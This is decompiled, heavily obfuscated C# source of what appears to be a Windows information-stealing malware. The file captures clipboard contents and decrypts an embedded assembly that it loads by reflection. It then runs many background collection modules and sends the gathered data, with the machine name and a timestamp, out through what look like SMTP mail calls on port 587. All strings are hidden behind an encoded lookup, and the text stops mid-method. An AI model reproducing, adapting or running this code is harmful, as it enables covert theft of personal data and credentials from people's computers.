using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using _0023Ye;
using _0023i;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace _0023f;

internal class _0023xD
{
	public static byte[] _00235F;

	public static bool _00236F;

	public static bool _00237F;

	public static bool _00238F;

	public static bool _00239F;

	public static bool _0023aG;

	public static bool _00235c;

	public static bool _0023bG;

	public static bool _0023cG;

	public static bool _0023dG;

	public static bool _0023eG;

	public static bool _0023fG;

	public static bool _0023gG;

	public static bool _0023hG;

	public static bool _0023iG;

	public static bool _0023jG;

	public static bool _0023kG;

	public static bool _0023lG;

	public static bool _0023mG;

	public static bool _0023nG;

	public static bool _0023oG;

	public static bool _0023pG;

	public static bool _0023qG;

	public static bool _0023rG;

	public static bool _0023sG;

	public static bool _0023tG;

	public static bool _0023uG;

	public static bool _0023vG;

	public static bool _0023wG;

	public static bool _0023xG;

	public static bool _0023yG;

	public static bool _0023zG;

	public static bool _0023AG;

	public static bool _0023BG;

	public static bool _0023CG;

	public static bool _0023DG;

	public static bool _0023EG;

	public static bool _0023FG;

	public static bool _0023GG;

	public static bool _0023HG;

	public static string _0023IG;

	public static bool _0023JG;

	public static int _0023KG;

	public static bool _0023LG;

	public static bool _0023MG;

	public static bool _0023NG;

	public static System.Timers.Timer _0023OG;

	public static string _0023PG;

	public static string _0023QG;

	public static string _0023RG;

	public static _0023zD _0023SG;

	[STAThread]
	public static void _0023b()
	{
		try
		{
			_00235F = _0023TG();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			_0023IG = Clipboard.GetText();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (_0023JG)
		{
			try
			{
				do
				{
					if (8u != 0)
					{
						Thread.Sleep(5000);
					}
				}
				while (1 == 0);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			if (0 == 0)
			{
				_00234G();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		bool num = _00235c;
		if (true)
		{
			if (num)
			{
				try
				{
					Thread thread = new Thread(_00231c);
					Thread thread2;
					if (4u != 0)
					{
						thread2 = thread;
					}
					if (0 == 0)
					{
						thread2.IsBackground = true;
					}
					if (5u != 0)
					{
						if (8u != 0)
						{
							thread2.Start();
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				Thread thread3 = new Thread(_0023WG);
				Thread thread4 = default(Thread);
				if (0 == 0)
				{
					thread4 = thread3;
				}
				thread4.IsBackground = true;
				thread4.Start();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			if (_00236F)
			{
				try
				{
					Thread thread5 = new Thread(_0023XG);
					thread5.IsBackground = true;
					thread5.Start();
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				_0023SG = new _0023zD();
				_0023zD._0023bH();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				_0023OG.Interval = _0023KG;
				_0023OG.Elapsed += _0023uD;
				_0023OG.Enabled = true;
				_0023OG.Start();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			if (_00237F)
			{
				try
				{
					Thread thread6 = new Thread(_0023YG);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
			}
			if (_00238F)
			{
				try
				{
					Thread thread7 = new Thread(_0023ZG);
					thread7.IsBackground = true;
					thread7.Start();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
			}
			num = _00239F;
		}
		if (num)
		{
			try
			{
				Thread thread8 = new Thread(_0023vD);
				thread8.IsBackground = true;
				thread8.Start();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Thread thread9 = new Thread(_0023wD);
			thread9.IsBackground = true;
			thread9.Start();
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread10;
			if (7u != 0)
			{
				thread10 = new Thread(_00232G);
				thread10.IsBackground = true;
			}
			thread10.Start();
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread11 = new Thread(_00231G);
			thread11.IsBackground = true;
			thread11.Start();
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread12 = new Thread(_00230G);
			thread12.IsBackground = true;
			if (0 == 0)
			{
				thread12.Start();
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	[SpecialName]
	public static byte[] _0023TG()
	{
		return Encoding.Default.GetBytes(_0023UG(Encoding.Default.GetString(_00233G(_0023h._0023g(245))), _0023h._0023g(282), _0023h._0023g(307)));
	}

	private static void _0023uD(object P_0, ElapsedEventArgs P_1)
	{
		string text2;
		string text4 = default(string);
		int num;
		if (uint.MaxValue != 0)
		{
			string text = _0023h._0023g(244);
			if (uint.MaxValue != 0)
			{
				text2 = text;
			}
			string text3 = _0023h._0023g(244);
			if (0 == 0)
			{
				text4 = text3;
			}
			if (7u != 0)
			{
				num = 0;
			}
		}
		WebClient webClient = new WebClient();
		WebClient webClient2;
		if (6u != 0)
		{
			webClient2 = webClient;
		}
		if (_0023MG)
		{
			try
			{
				string[] array = new string[6];
				string[] array2;
				if (3u != 0)
				{
					array2 = array;
				}
				array2[0] = _0023h._0023g(332);
				array2[1] = Environment.NewLine;
				array2[2] = Environment.NewLine;
				array2[3] = _0023IG;
				array2[4] = Environment.NewLine;
				array2[5] = Environment.NewLine;
				string text5 = string.Concat(array2);
				if (5u != 0)
				{
					text2 = text5;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			text4 = _0023h._0023g(365) + webClient2.DownloadString(_0023h._0023g(406)) + _0023h._0023g(435);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(_0023RG, _0023h._0023g(244), false) != 0)
			{
				try
				{
					string[] array2 = new string[5];
					if (0 == 0)
					{
						array2[0] = _0023RG;
						array2[1] = _0023h._0023g(435);
						array2[2] = text4;
						array2[3] = _0023h._0023g(444);
						array2[4] = text2;
					}
					_0023QG = string.Concat(array2);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					if (0 == 0)
					{
						ProjectData.ClearProjectError();
					}
				}
				string text6 = _0023h._0023g(449) + ((ServerComputer)_0023mb._0023jb()).get_Name() + _0023h._0023g(502) + DateTime.Now;
				if (_0023NG)
				{
					if (_0023aG)
					{
						try
						{
							_0023VG(_00235F, _0023h._0023g(511), _0023h._0023g(564), new object[5]
							{
								_0023h._0023g(573),
								text6,
								_0023QG,
								true,
								num
							});
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						try
						{
							_0023VG(_00235F, _0023h._0023g(586), _0023h._0023g(639), new object[9]
							{
								_0023h._0023g(648),
								_0023h._0023g(681),
								_0023h._0023g(706),
								587,
								text6,
								_0023QG,
								true,
								num,
								false
							});
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
				}
				else if (_0023aG)
				{
					try
					{
						_0023VG(_00235F, _0023h._0023g(511), _0023h._0023g(564), new object[5]
						{
							_0023h._0023g(573),
							text6,
							_0023QG,
							false,
							num
						});
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					try
					{
						_0023VG(_00235F, _0023h._0023g(586), _0023h._0023g(639), new object[9]
						{
							_0023h._0023g(648),
							_0023h._0023g(681),
							_0023h._0023g(706),
							587,
							text6,
							_0023QG,
							false,
							num,
							false
						});
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			_0023QG = _0023h._0023g(244);
			_0023RG = _0023h._0023g(244);
			_0023PG = _0023h._0023g(244);
			num++;
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static string _0023UG(string P_0, string P_1, string P_2)
	{
		//Discarded unreachable code: IL_013d, IL_014e
		try
		{
			int num = 727;
			nint num2 = num;
			string s = default(string);
			byte[] rgbIV = default(byte[]);
			byte[] array = default(byte[]);
			byte[] bytes3 = default(byte[]);
			RijndaelManaged rijndaelManaged = default(RijndaelManaged);
			while (true)
			{
				string text = _0023h._0023g(num);
				string strHashName;
				if (4u != 0)
				{
					strHashName = text;
				}
				string text3;
				int num3;
				byte[] bytes2;
				if (0 == 0)
				{
					string text2 = Conversions.ToString(2);
					if (6u != 0)
					{
						text3 = text2;
					}
					num = 736;
					num2 = num;
					if (num == 0)
					{
						goto IL_00dc;
					}
					if (num == 0)
					{
						goto IL_00df;
					}
					string text4 = _0023h._0023g(num);
					if (0 == 0)
					{
						s = text4;
					}
					if (true)
					{
						num3 = 256;
					}
					if (Operators.CompareString(P_0, _0023h._0023g(244), false) == 0)
					{
						string result = _0023h._0023g(244);
						if (6 == 0)
						{
							break;
						}
						return result;
					}
					byte[] bytes = Encoding.ASCII.GetBytes(s);
					if (3u != 0)
					{
						rgbIV = bytes;
					}
					bytes2 = Encoding.ASCII.GetBytes(P_2);
					array = Convert.FromBase64String(P_0);
				}
				PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(P_1, bytes2, strHashName, Conversions.ToInteger(text3));
				bytes3 = passwordDeriveBytes.GetBytes((int)Math.Round((double)num3 / 8.0));
				rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.Mode = CipherMode.CBC;
				num2 = (nint)array.LongLength;
				goto IL_00dc;
				IL_00df:
				if (false)
				{
					continue;
				}
				byte[] array2 = new byte[num + 1];
				int count = 0;
				using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, rgbIV))
				{
					MemoryStream memoryStream = new MemoryStream(array);
					try
					{
						using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
						count = cryptoStream.Read(array2, 0, array2.Length);
						memoryStream.Close();
						cryptoStream.Close();
					}
					finally
					{
						if (memoryStream != null && 0 == 0)
						{
							((IDisposable)memoryStream).Dispose();
						}
					}
				}
				rijndaelManaged.Clear();
				return Encoding.UTF8.GetString(array2, 0, count);
				IL_00dc:
				num = checked((int)num2) - 1;
				num2 = num;
				goto IL_00df;
			}
			string result2;
			return result2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = _0023h._0023g(244);
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	public static object _0023VG(byte[] P_0, string P_1, string P_2, object[] P_3)
	{
		try
		{
			object[] array2 = default(object[]);
			object[] array4 = default(object[]);
			Assembly assembly2 = default(Assembly);
			Type type2 = default(Type);
			MethodInfo methodInfo = default(MethodInfo);
			while (true)
			{
				object[] array = new object[4];
				if (0 == 0)
				{
					array2 = array;
				}
				while (true)
				{
					array2[0] = P_0;
					if (false)
					{
						break;
					}
					if (0 == 0)
					{
						array2[1] = P_1;
						if (false)
						{
							continue;
						}
						array2[2] = P_2;
					}
					array2[3] = P_3;
					object[] array3 = array2;
					if (0 == 0)
					{
						array4 = array3;
					}
					byte[] obj = (byte[])array4[0];
					byte[] rawAssembly;
					if (4u != 0)
					{
						rawAssembly = obj;
					}
					Assembly assembly = Assembly.Load(rawAssembly);
					if (0 == 0)
					{
						assembly2 = assembly;
					}
					Type? type = assembly2.GetType(Conversions.ToString(array4[1]));
					if (0 == 0)
					{
						type2 = type;
					}
					MethodInfo? method = type2.GetMethod(Conversions.ToString(array4[2]));
					if (0 == 0)
					{
						methodInfo = method;
					}
					return methodInfo.Invoke(null, (object[])array4[3]);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _00231c()
	{
		try
		{
			if (4u != 0)
			{
				_0023VG(_00235F, _0023h._0023g(761), _0023h._0023g(810), new object[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (0 == 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0023WG()
	{
		try
		{
			if (4u != 0)
			{
				_0023VG(_00235F, _0023h._0023g(761), _0023h._0023g(819), new object[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (0 == 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0023XG()
	{
		try
		{
			byte[] array = _00235F;
			string text = _0023h._0023g(761);
			string text2 = _0023h._0023g(840);
			object[] array2 = new object[2];
			object[] array3;
			if (6u != 0)
			{
				array3 = array2;
			}
			array3[0] = _0023h._0023g(861);
			array3[1] = _0023h._0023g(878);
			_0023VG(array, text, text2, array3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			do
			{
				ProjectData.ClearProjectError();
			}
			while (2 == 0);
		}
	}

	public static void _0023YG()
	{
		try
		{
			byte[] array = _00235F;
			string text = _0023h._0023g(761);
			string text2 = _0023h._0023g(895);
			object[] array2 = new object[3];
			object[] array3 = default(object[]);
			if (0 == 0)
			{
				array3 = array2;
			}
			array3[0] = _0023h._0023g(912);
			array3[1] = _0023h._0023g(925);
			array3[2] = 12345670;
			_0023VG(array, text, text2, array3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (0 == 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0023ZG()
	{
		try
		{
			if (2u != 0 && uint.MaxValue != 0)
			{
				byte[] array = _00235F;
				string text = _0023h._0023g(761);
				string text2 = _0023h._0023g(934);
				object[] array2 = new object[1];
				object[] array3;
				if (2u != 0)
				{
					array3 = array2;
				}
				array3[0] = _0023h._0023g(959);
				_0023VG(array, text, text2, array3);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _0023vD()
	{
		string text = _0023h._0023g(968);
		string name = ((ServerComputer)_0023mb._0023jb()).get_Name();
		string text2 = _0023h._0023g(502);
		DateTime now = DateTime.Now;
		DateTime dateTime;
		if (6u != 0)
		{
			dateTime = now;
		}
		string text3 = text + name + text2 + dateTime;
		string text4;
		if (5u != 0)
		{
			text4 = text3;
		}
		string text5 = Conversions.ToString(_0023VG(_00235F, _0023h._0023g(761), _0023h._0023g(1025), new object[0]));
		string text6 = default(string);
		if (0 == 0)
		{
			text6 = text5;
		}
		string text7 = _0023h._0023g(1058) + text6;
		string text8;
		if (7u != 0)
		{
			text8 = text7;
		}
		if (_0023aG)
		{
			try
			{
				byte[] array = _00235F;
				string text9 = _0023h._0023g(511);
				string text10 = _0023h._0023g(564);
				object[] array2 = new object[5];
				object[] array3;
				if (uint.MaxValue != 0)
				{
					array3 = array2;
				}
				array3[0] = _0023h._0023g(573);
				array3[1] = text4;
				array3[2] = text8;
				array3[3] = true;
				array3[4] = 1337;
				_0023VG(array, text9, text10, array3);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			byte[] array4 = _00235F;
			string text11 = _0023h._0023g(586);
			string text12 = _0023h._0023g(639);
			object[] array5 = new object[9];
			object[] array3;
			if (6u != 0)
			{
				array3 = array5;
			}
			array3[0] = _0023h._0023g(648);
			array3[1] = _0023h._0023g(681);
			array3[2] = _0023h._0023g(706);
			array3[3] = 587;
			array3[4] = text4;
			array3[5] = text8;
			array3[6] = true;
			array3[7] = 1337;
			array3[8] = false;
			_0023VG(array4, text11, text12, array3);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void _00230G()
	{
		if (_0023iG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(1183), _0023h._0023g(1240), new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		do
		{
			if (!_0023jG)
			{
				continue;
			}
			try
			{
				_0023VG(_00235F, _0023h._0023g(1183), _0023h._0023g(1257), new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				do
				{
					if (0 == 0)
					{
						ProjectData.ClearProjectError();
					}
				}
				while (3 == 0);
			}
		}
		while (1 == 0);
	}

	public static void _00231G()
	{
		if (_0023DG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(761), _0023h._0023g(1278), new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		object[] array3 = default(object[]);
		if (_0023EG)
		{
			try
			{
				byte[] array = _00235F;
				string text = _0023h._0023g(1299);
				string text2 = _0023h._0023g(1352);
				object[] array2 = new object[1];
				if (8u != 0)
				{
					array3 = array2;
				}
				array3[0] = _0023h._0023g(1369);
				_0023VG(array, text, text2, array3);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (!_0023FG)
		{
			return;
		}
		try
		{
			byte[] array4 = _00235F;
			string text3 = _0023h._0023g(761);
			string text4 = _0023h._0023g(1386);
			object[] array5 = new object[1];
			if (0 == 0)
			{
				array3 = array5;
			}
			array3[0] = _0023h._0023g(1403);
			_0023VG(array4, text3, text4, array3);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void _0023wD()
	{
		if (_0023bG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1477), new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (_0023cG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1486), new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (_0023dG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1499), new object[0]);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (_0023eG)
		{
			try
			{
				_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1512), new object[0]);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		StringBuilder stringBuilder2 = default(StringBuilder);
		if (0 == 0)
		{
			if (_0023fG)
			{
				try
				{
					_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1525), new object[0]);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023gG)
			{
				try
				{
					_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1538), new object[0]);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023hG)
			{
				try
				{
					_0023VG(_00235F, _0023h._0023g(1416), _0023h._0023g(1551), new object[0]);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			StringBuilder stringBuilder = new StringBuilder();
			if (0 == 0)
			{
				stringBuilder2 = stringBuilder;
			}
			if (_0023iG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(1564), _0023h._0023g(1649), new object[0])));
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023jG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(1662), _0023h._0023g(1649), new object[0])));
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023kG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(1739), _0023h._0023g(1816), new object[0])));
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023lG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(1829), _0023h._0023g(1918), new object[0])));
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023mG)
			{
				try
				{
					do
					{
						stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(1931), _0023h._0023g(2008), new object[0])));
					}
					while (8 == 0);
				}
				catch (Exception projectError12)
				{
					ProjectData.SetProjectError(projectError12);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023nG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2021), _0023h._0023g(2122), new object[0])));
				}
				catch (Exception projectError13)
				{
					ProjectData.SetProjectError(projectError13);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023oG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2131), _0023h._0023g(2208), new object[0])));
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023pG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2225), _0023h._0023g(2302), new object[0])));
				}
				catch (Exception projectError15)
				{
					ProjectData.SetProjectError(projectError15);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023qG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2319), _0023h._0023g(2396), new object[0])));
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023rG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2409), _0023h._0023g(2490), new object[0])));
				}
				catch (Exception projectError17)
				{
					ProjectData.SetProjectError(projectError17);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023sG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2507), _0023h._0023g(2580), new object[0])));
				}
				catch (Exception projectError18)
				{
					ProjectData.SetProjectError(projectError18);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023tG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2589), _0023h._0023g(2666), new object[0])));
				}
				catch (Exception projectError19)
				{
					ProjectData.SetProjectError(projectError19);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023uG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2679), _0023h._0023g(2752), new object[0])));
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023vG)
			{
				try
				{
					stringBuilder2.AppendLine(Conversions.ToString(_0023VG(_00235F, _0023h._0023g(2765), _0023h._0023g(2838), new object[0])));
				}
				catch (Exception projectError21)
				{
					ProjectData.SetProjectError(projectError21);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (Operators.CompareString(stringBuilder2.ToString(), _0023h._0023g(244), false) != 0)
		{
			string text = _0023h._0023g(2851);
			string name = ((ServerComputer)_0023mb._0023jb()).get_Name();
			string text2 = _0023h._0023g(502);
			DateTime now = DateTime.Now;
			DateTime dateTime = default(DateTime);
			if (0 == 0)
			{
				dateTime = now;
			}
			string text3 = text + name + text2 + dateTime;
			string text4 = default(string);
			if (0 == 0)
			{
				text4 = text3;
			}
			if (_0023aG)
			{
				try
				{
					byte[] array = _00235F;
					string text5 = _0023h._0023g(511);
					string text6 = _0023h._0023g(564);
					object[] array2 = new object[5];
					object[] array3;
					if (2u != 0)
					{
						array3 = array2;
					}
					array3[0] = _0023h._0023g(573);
					array3[1] = text4;
					array3[2] = stringBuilder2.ToString();
					array3[3] = false;
					array3[4] = 1337;
					_0023VG(array, text5, text6, array3);
				}
				catch (Exception projectError22)
				{
					ProjectData.SetProjectError(projectError22);
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				try
				{
					byte[] array4 = _00235F;
					string text7 = _0023h._0023g(586);
					string text8 = _0023h._0023g(639);
					object[] array5 = new object[9];
					object[] array3 = default(object[]);
					if (0 == 0)
					{
						array3 = array5;
					}
					array3[0] = _0023h._0023g(648);
					array3[1] = _0023h._0023g(681);
					array3[2] = _0023h._0023g(706);
					array3[3] = 587;
					array3[4] = text4;
					array3[5] = stringBuilder2.ToString();
					array3[6] = false;
					array3[7] = 1337;
					array3[8] = true;
					_0023VG(array4, text7, text8, array3);
				}
				catch (Exception projectError23)
				{
					ProjectData.SetProjectError(projectError23);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (_0023LG)
		{
			if (2u != 0)
			{
				Environment.Exit(0);
			}
		}
	}

	public static void _00232G()
	{
		if (_0023wG)
		{
			try
			{
				do
				{
					_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(2986), new object[0]);
				}
				while (-1 == 0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		bool num = _0023xG;
		if (0 == 0)
		{
			if (num)
			{
				try
				{
					_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3003), new object[0]);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023BG)
			{
				try
				{
					do
					{
						_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3008), new object[0]);
					}
					while (false);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023yG)
			{
				try
				{
					do
					{
						_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3021), new object[0]);
					}
					while ((4 == 0) ? true : false);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (_0023AG)
			{
				try
				{
					_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3026), new object[0]);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			num = _0023zG;
		}
		if (num)
		{
			try
			{
				_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3047), new object[0]);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (_0023CG)
		{
			try
			{
				_0023VG(_00235F, _0023Ob._00235G(_0023h._0023g(2904), _0023h._0023g(2977)), _0023h._0023g(3064), new object[0]);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] _00233G(string P_0)
	{
		try
		{
			byte[] buffer = default(byte[]);
			int count = default(int);
			MemoryStream memoryStream2 = default(MemoryStream);
			byte[] result = default(byte[]);
			do
			{
				if (6u != 0)
				{
					Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(P_0);
					Stream stream;
					if (4u != 0)
					{
						stream = manifestResourceStream;
					}
					byte[] array = new byte[(int)(stream.Length - 1) + 1];
					if (0 == 0)
					{
						buffer = array;
					}
					int num = stream.Read(buffer, 0, (int)stream.Length);
					if (0 == 0)
					{
						count = num;
					}
					if (0 == 0)
					{
						MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
						if (8u != 0)
						{
							memoryStream2 = memoryStream;
						}
					}
				}
				byte[] array2 = memoryStream2.ToArray();
				if (0 == 0)
				{
					result = array2;
				}
			}
			while (2 == 0);
			return result;
		}
		catch (Exception ex)
		{
